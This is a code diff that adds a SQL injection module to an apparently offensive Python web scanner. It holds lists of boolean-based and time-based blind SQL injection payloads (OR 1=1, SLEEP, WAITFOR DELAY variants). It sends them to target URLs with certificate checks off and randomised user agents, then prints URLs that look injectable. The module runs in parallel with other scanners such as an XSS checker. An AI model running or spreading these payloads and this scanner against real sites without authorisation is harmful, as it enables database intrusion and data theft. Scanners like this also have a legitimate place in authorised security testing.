@@ -14,6 +14,16 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 threads =30
 USR_AGENTS=regex.USR_AGENTS
 
+def response_time(url):
+    user_agent=random.choice(USR_AGENTS)
+    headers = {'User-Agent': user_agent } 
+    try:
+        r = requests.get(url,headers=headers,verify=False)   
+        r_time = int(r.elapsed.total_seconds())
+        return r_time
+    except:
+        pass
+
 def rev(str_):
         linth=len(str_)
         rs=''
@@ -99,7 +109,122 @@ def xss_(link):
                               
     except:
         pass
-           
+def sqlinjection(url):
+  
+    SQL_INJECTION_ERROR_BASE={
+    "%20OR%201=1%20":"%20OR%201=0%20",
+    "%20OR%20x=x":"%20OR%20x=y",
+    "%20OR%201=1#":"%20OR%201=0#",
+    "%20OR%20x=x#":"%20OR%20x=y#",
+    "%20OR%201=1--":"%20OR%201=0--",
+    "%20OR%201=1":"%20OR%201=0",
+    "%20OR%20x=x--":"%20OR%20x=y--",
+    "%20OR%203409=3409%20AND%20('pytW'%20LIKE%20'pytW":"%20OR%203409=3409%20AND%20('pytW'%20LIKE%20'pytY",
+    "%20HAVING%201=1":"%20HAVING%201=0",
+    "%20HAVING%201=1#":"%20HAVING%201=0#",
+    "%20HAVING%201=1--%20":"%20HAVING%201=0--%20",
+    "%20AND%201=1%20":"%20AND%201=0%20",
+    "%20AND%201=1":"%20AND%201=0",
+    "%20AND%201=1--%20":"%20AND%201=0--%20",
+    "%20AND%201=1#":"%20AND%201=0#",
+    "%20AND%201=1%20AND%20'%'='":"%20AND%201=0%20AND%20'%'='",
+    "%20AND%201083=1083%20AND%20(1427=1427":"%20AND%207506=9091%20AND%20(5913=5913",
+    "%20AND%201083=1083%20AND%20('1427=1427":"%20AND%207506=9091%20AND%20('5913=5913",
+    "%20AND%207300=7300%20AND%20'pKlZ'='pKlZ":"%20AND%207300=7300%20AND%20'pKlZ'='pKlY",
+    "%20AND%207300=7300%20AND%20('pKlZ'='pKlZ":"%20AND%207300=7300%20AND%20('pKlZ'='pKlY",
+    "%20AS%20INJECTX%20WHERE%201=1%20AND%201=1":"%20AS%20INJECTX%20WHERE%201=1%20AND%201=0",
+    "%20AS%20INJECTX%20WHERE%201=1%20AND%201=1#":"%20AS%20INJECTX%20WHERE%201=1%20AND%201=0#",
+    "%20AS%20INJECTX%20WHERE%201=1%20AND%201=1--":"%20AS%20INJECTX%20WHERE%201=1%20AND%201=0--",
+    "%20WHERE%201=1%20AND%201=1":"%20WHERE%201=1%20AND%201=0",
+    "%20WHERE%201=1%20AND%201=1#":"%20WHERE%201=1%20AND%201=0#",
+    "%20WHERE%201=1%20AND%201=1--":"%20WHERE%201=1%20AND%201=0--",}
+    SQL_INJECTION_BLIND_BASE=[
+    '%20 0"XOR(if(now()=sysdate(),sleep({}),0))XOR"Z',
+    '%20 0"XOR(if(now()=sysdate(),sleep({}),0))XOR”Z',
+    "%20AnD%20SLEEP({})",
+    "%20AnD%20SLEEP({})--",
+    "%20AnD%20SLEEP({})#",
+    "%20&&SLEEP({})",
+    "%20&&SLEEP({})--",
+    "%20&&SLEEP({})#",
+    "%20SLEEP({})#",
+    "'%20AnD%20SLEEP({})%20ANd%20'1",
+    "%20'&&SLEEP({})&&'1",
+    "%20ORDER%20BY%20SLEEP({})",
+    "%20ORDER%20BY%20SLEEP({})--",
+    "%20ORDER%20BY%20SLEEP({})#",
+    "(SELECT%20*%20FROM%20(SELECT(SLEEP({})))ecMj)",
+    "%20(SELECT%20*%20FROM%20(SELECT(SLEEP({})))ecMj)#",
+    "(SELECT%20*%20FROM%20(SELECT(SLEEP({})))ecMj)--",
+    "%20+%20SLEEP({})%20+%20'",
+    "%20SLEEP({})/*",
+    "%20SLEEP({})",
+    '%20or%20SLEEP({})',
+    '''"or%20SLEEP({})%20or%20"*/''',
+    '%2b(select*from(select(sleep({})))a)%2b',
+    ";WAITFOR DELAY '0:0:{}'--",
+    " WAITFOR DELAY '0:0:{}'",
+    "%20;WAITFOR DELAY '0:0:{}'--",
+    "%20WAITFOR DELAY '0:0:{}'",
+    ]
+
+    try:
+        r1=requests.get(url+'test',verify=False,timeout=13).text
+        r2=requests.get(url+'test',verify=False,timeout=13).text
+        if len(r1)==len(r2) :
+            for god,bad in SQL_INJECTION_ERROR_BASE.items():
+                
+                r1=requests.get(url+god,verify=False,timeout=13)
+                god_r=r1.content
+                sr1=r1.status_code
+                r2=requests.get(url+bad,verify=False,timeout=13)
+                bad_r=r2.content
+                sr2=r2.status_code
+                if len(god_r) != len(bad_r) or sr1 != sr2:
+                    
+                    print("\033[91mPossibly SQL injection vulnerability\033[00m  ")
+                    print(url+god+' | response Length:'+str(len(god_r))+'  status code: '+str(sr1)+'\n'+url+bad+' | response Length:'+str(len(bad_r))+'  status code: '+str(sr1))
+                        
+                    
+    except:
+        pass
+
+
+    try:
+        for x in SQL_INJECTION_BLIND_BASE:
+            
+                
+                r1=url+x.format('3')
+               
+                rs1=response_time(r1)
+                
+                r2=url+x.format('6')
+               
+                rs2=response_time(r2)
+               
+                r3=url+x.format('9')
+                
+                rs3=response_time(r3)
+                
+              
+                if int(rs1) < int(rs2) and int(rs1) < int(rs3):
+                    if int(rs2) > int(rs1) and int(rs2) < int(rs3):
+                           if int(rs3) > int(rs1) and int(rs3) > int(rs2):
+                                rr=url+x.format('0')
+                                rs=response_time(rr)
+                                if int(rs) < int(rs1)  and int(rs) <  int(rs2) and int(rs) < int(rs3):
+                                    
+                                    
+                                    print(r1+' | Response time:'+'\033[32m'+str(rs1)+'\033[00m'+'\n'+r2+' | Response time:'+'\033[32m'+str(rs2)+'\033[00m'+'\n'+r3+' | Response time:'+'\033[32m'+str(rs3)+'\033[00m')
+                                    break
+                           
+                               
+    except:
+        pass
+
+
+
+               
 def git_(i):
     
    
@@ -382,5 +507,7 @@ def run(i):
     p5.start()
     #p6 = Process(target=backupfile_, args=(i,)) #need more work
     #p6.start()
+    p7 = Process(target=sqlinjection, args=(i,)) 
+    p7.start()
     
     
